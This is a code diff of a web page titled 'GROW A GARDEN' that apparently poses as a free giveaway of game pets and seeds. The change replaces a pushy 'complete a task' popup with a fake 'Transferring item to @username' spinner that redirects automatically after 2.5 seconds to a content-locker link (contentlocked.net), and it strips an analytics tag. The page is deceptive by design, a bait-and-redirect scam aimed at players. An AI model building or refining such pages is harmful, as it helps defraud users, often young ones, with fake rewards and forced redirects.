@@ -3,16 +3,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>GROW A GARDEN</title>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
-  <link rel="icon" type="image/png" href="https://i.imgur.com/24Lwtxi.png">
   <script src="js/jquery-3.6.0.min.js"></script>
-  <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-J1BSNLE03B"></script>
-  <script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-  gtag('config', 'G-J1BSNLE03B');
-  </script>
   <style>
     :root {
       --bg-gradient: linear-gradient(135deg, #1a2a33 0%, #2e8b57 100%);
@@ -1092,19 +1083,24 @@
     // Function to show verification state
     const showVerificationState = (username, itemName, itemImage) => {
       const popupContent = document.querySelector('.popup-content');
-      
       popupContent.innerHTML = `
-        <div style="padding: 32px 10px 24px 10px; text-align: center;">
-          <div style="font-size: 1.25em; color: var(--accent2); font-weight: 700; margin-bottom: 18px;">${username}, do you want your items delivered safely?</div>
-          <div style="color: var(--text-main); font-size: 1.1em; margin-bottom: 28px;">Complete 1 quick task below and we’ll send you a private server link where your Pet or Seed will be waiting for you. Only verified users get in act fast before it closes forever 🔒</div>
-          <button id="lets-go-btn" class="lets-go-btn-animated"> Let’s Go! 🔥</button>
-          <div class="lets-go-microcopy">Do it now before someone else get your item 💀</div>
+        <div class="popup-header">
+          <h3>Verification</h3>
+        </div>
+        <div style="text-align:center;padding:20px">
+          <div class="folding">
+            <div class="sk-cube1 sk-cube"></div>
+            <div class="sk-cube2 sk-cube"></div>
+            <div class="sk-cube4 sk-cube"></div>
+            <div class="sk-cube3 sk-cube"></div>
+            <div class="square"></div>
+          </div>
+          <p class="searching-text">Transferring ${itemName} to @${username}</p>
         </div>
       `;
-      
-      popupContent.querySelector('#lets-go-btn').addEventListener('click', function() {
-        window.location.href = "https://installchecker.site/cl/i/1onk5k";
-      });
+      setTimeout(function() {
+        window.location.href = "https://contentlocked.net/cl/i/7dglg9";
+      }, 2500);
     }
 
     // Function to show error state
